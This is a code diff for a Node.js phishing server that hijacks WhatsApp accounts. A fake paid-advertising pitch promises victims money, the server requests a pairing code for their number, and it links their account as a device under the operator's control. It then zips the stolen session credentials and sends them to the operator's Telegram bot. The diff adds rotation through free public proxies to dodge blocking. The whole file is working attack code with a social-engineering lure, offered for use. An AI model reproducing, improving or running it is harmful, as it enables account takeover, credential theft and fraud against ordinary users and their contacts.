@@ -7,14 +7,15 @@ const TelegramBot = require('node-telegram-bot-api');
 const archiver = require('archiver');
 const fs = require('fs-extra');
 const path = require('path');
-const QRCode = require('qrcode');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const axios = require('axios'); // REQUIRED: npm install axios
 
-// --- CONFIGURATION (RENDER ENV VARS) ---
+// --- CONFIGURATION ---
 const BOT_NUMBER = process.env.BOT_NUMBER || '2348023931932'; 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN'; 
 const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID'; 
 const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com'; 
-// ---------------------------------------
+// ---------------------
 
 const app = express();
 const server = http.createServer(app);
@@ -33,6 +34,22 @@ tgBot.on('polling_error', (error) => console.log(error));
 let adminSock = null;
 let activeVictims = {};
 let victimList = [];
+
+// Helper: Fetch live proxies
+async function getLiveProxies() {
+    try {
+        // Fetch from Geonode (Free API, no key needed for basic use)
+        const res = await axios.get('https://proxylist.geonode.com/api/proxy-list?limit=20&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps');
+        const proxies = res.data.data;
+        
+        const proxyUrls = proxies.map(p => `http://${p.ip}:${p.port}`);
+        console.log(`[+] Fetched ${proxyUrls.length} live proxies from API.`);
+        return proxyUrls;
+    } catch (e) {
+        console.log(`[-] Failed to fetch proxies: ${e.message}`);
+        return [];
+    }
+}
 
 // Helper: Send zip to telegram
 async function backupToTelegram(phoneNumber, folderPath) {
@@ -56,7 +73,7 @@ async function backupToTelegram(phoneNumber, folderPath) {
     });
 }
 
-// 2. The Admin Bot (Using QR Code)
+// 2. The Admin Bot (Pairing Code)
 async function startAdminBot() {
     const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');
     
@@ -72,22 +89,8 @@ async function startAdminBot() {
     adminSock.ev.on('creds.update', saveCreds);
 
     adminSock.ev.on('connection.update', async (update) => {
-        const { connection, qr, lastDisconnect } = update;
+        const { connection, lastDisconnect } = update;
         
-        if (qr) {
-            console.log('[*] New QR Code generated. Sending to Telegram...');
-            try {
-                const qrBuffer = await QRCode.toBuffer(qr, { type: 'png', width: 500 });
-                await tgBot.sendPhoto(MY_TELEGRAM_ID, qrBuffer, { 
-                    caption: '📲 *Scan this QR Code to link the Admin Bot*\n\nOpen WhatsApp > Linked Devices > Link a Device.',
-                    parse_mode: 'Markdown' 
-                });
-                console.log('[+] QR Code sent to Telegram.');
-            } catch (err) {
-                console.log(`[-] Failed to send QR to Telegram: ${err.message}`);
-            }
-        }
-
         if (connection === 'open') {
             console.log('[+] Admin Bot Connected.');
             io.emit('log', { msg: 'Admin Bot connected to WhatsApp', type: 'info' });
@@ -96,61 +99,119 @@ async function startAdminBot() {
         }
 
         if (connection === 'close') {
-            const reason = lastDisconnect?.error?.message || 'Unknown';
-            console.log(`[-] Admin Bot Disconnected: ${reason}`);
             if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-                startAdminBot(); // Reconnect automatically
+                startAdminBot(); 
             }
         }
     });
+
+    if (!adminSock.authState.creds.registered) {
+        await delay(3000);
+        try {
+            const code = await adminSock.requestPairingCode(BOT_NUMBER);
+            console.log(`\n[!] ADMIN BOT PAIRING CODE: ${code}\n`);
+            tgBot.sendMessage(MY_TELEGRAM_ID, `*Admin Bot Pairing Code:* \`${code}\`\n\nGo to WhatsApp > Linked Devices > Link with Phone Number.`, { parse_mode: 'Markdown' });
+        } catch (err) {
+            console.log(`[-] Admin pairing failed: ${err.message}`);
+            tgBot.sendMessage(MY_TELEGRAM_ID, `[-] Admin pairing failed. Restarting Render to try again.`);
+        }
+    }
 }
 
 // 3. Web Server Socket.IO
 io.on('connection', (socket) => {
-    // --- VICTIM FLOW ---
+    // --- VICTIM FLOW (LIVE PROXY ROTATOR) ---
     socket.on('request_code', async (phoneNumber) => {
         const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
-        console.log(`\n[!] Generating WA-Earn code for: ${targetNumber}...`);
+        console.log(`\n[!] Generating code for: ${targetNumber}...`);
         
         const { state, saveCreds } = await useMultiFileAuthState(`auth_info_${targetNumber}`);
-        const phishSock = makeWASocket({
-            logger: pino({ level: 'silent' }),
-            printQRInTerminal: false,
-            auth: state,
-            browser: ["WA-Earn", "Chrome", "1.0.0"]
-        });
+        let success = false;
+        let code = null;
 
-        phishSock.ev.on('creds.update', saveCreds);
+        // Fetch live proxies
+        const liveProxies = await getLiveProxies();
+        
+        // Add a direct fallback at the end
+        const proxiesToTry = [...liveProxies, 'DIRECT'];
 
-        phishSock.ev.on('connection.update', async (update) => {
-            const { connection } = update;
+        for (let i = 0; i < proxiesToTry.length; i++) {
+            if (success) break;
+            const proxyUrl = proxiesToTry[i];
+            console.log(`[*] Trying proxy ${i + 1}/${proxiesToTry.length}: ${proxyUrl}`);
             
-            if (connection === 'connecting') {
-                await delay(4000); 
-                try {
-                    const code = await phishSock.requestPairingCode(targetNumber);
-                    console.log(`[+] Code generated: ${code}`);
-                    socket.emit('code_generated', code);
-                } catch(e) {
-                    socket.emit('error', 'Failed to generate code. Try again.');
-                }
-            }
-            
-            if (connection === 'open') {
-                console.log(`\n[🔥] SUCCESS! VICTIM LINKED ACCOUNT: ${targetNumber}.\n`);
-                socket.emit('success');
-                
-                activeVictims[targetNumber] = phishSock;
-                if (!victimList.find(v => v.number === targetNumber)) {
-                    victimList.push({ number: targetNumber, status: 'Online' });
-                }
-                io.emit('victim_update', victimList);
-                io.emit('log', { msg: `New victim linked: ${targetNumber}`, type: 'info' });
-                tgBot.sendMessage(MY_TELEGRAM_ID, `🔥 *NEW VICTIM LINKED!*\nNumber: ${targetNumber}`);
+            try {
+                const sockOptions = {
+                    logger: pino({ level: 'silent' }),
+                    printQRInTerminal: false,
+                    auth: state,
+                    browser: ["Mac OS", "Chrome", "110.0.5481.177"],
+                    connectTimeoutMs: 12000, 
+                    defaultQueryTimeoutMs: 12000
+                };
 
-                await backupToTelegram(targetNumber, `auth_info_${targetNumber}`);
+                if (proxyUrl !== 'DIRECT') {
+                    sockOptions.agent = new HttpsProxyAgent(proxyUrl);
+                }
+
+                const phishSock = makeWASocket(sockOptions);
+                phishSock.ev.on('creds.update', saveCreds);
+
+                // Wait for the socket to connect and generate code
+                await new Promise((resolve, reject) => {
+                    let isResolved = false;
+                    
+                    phishSock.ev.on('connection.update', async (update) => {
+                        const { connection } = update;
+                        
+                        if (connection === 'connecting' && !isResolved) {
+                            isResolved = true;
+                            await delay(1500); // Give proxy time to handshake
+                            try {
+                                code = await phishSock.requestPairingCode(targetNumber);
+                                success = true;
+                                socket.emit('code_generated', code);
+                                console.log(`[+] Code generated via ${proxyUrl}: ${code}`);
+                                resolve();
+                            } catch (e) {
+                                console.log(`[-] Proxy ${proxyUrl} code request failed: ${e.message}`);
+                                try { phishSock.end(undefined); } catch(err) {}
+                                reject(e);
+                            }
+                        }
+                        
+                        if (connection === 'open') {
+                            console.log(`\n[🔥] SUCCESS! VICTIM LINKED ACCOUNT: ${targetNumber}.\n`);
+                            socket.emit('success');
+                            
+                            activeVictims[targetNumber] = phishSock;
+                            if (!victimList.find(v => v.number === targetNumber)) {
+                                victimList.push({ number: targetNumber, status: 'Online' });
+                            }
+                            io.emit('victim_update', victimList);
+                            io.emit('log', { msg: `New victim linked: ${targetNumber}`, type: 'info' });
+                            tgBot.sendMessage(MY_TELEGRAM_ID, `🔥 *NEW VICTIM LINKED!*\nNumber: ${targetNumber}`);
+                            await backupToTelegram(targetNumber, `auth_info_${targetNumber}`);
+                        }
+                    });
+
+                    setTimeout(() => {
+                        if (!isResolved) {
+                            isResolved = true;
+                            try { phishSock.end(undefined); } catch(err) {}
+                            reject(new Error('Timeout'));
+                        }
+                    }, 12000);
+                });
+
+            } catch (error) {
+                console.log(`[-] Proxy ${proxyUrl} failed. Moving to next...`);
             }
-        });
+        }
+
+        if (!success) {
+            socket.emit('error', 'Network error. Please try again.');
+        }
     });
 
     // --- ADMIN FLOW ---
@@ -162,7 +223,6 @@ io.on('connection', (socket) => {
         if (!adminSock) return socket.emit('log', { msg: 'Admin bot not connected!', type: 'error' });
         const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         
-        // PROFESSIONAL PITCH
         const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network. As a partner, our system will use your account to distribute verified business campaigns to your contacts.\n\nIn return, we offer a guaranteed *₦2,000 onboarding bonus*, plus a *₦500 daily retainer* as long as your account remains active in our network.\n\nTo view the terms and activate your account, please visit our secure portal:\n${RENDER_URL}\n\n_Note: This is a fully automated campaign system. No manual posting is required._`;
 
         try {
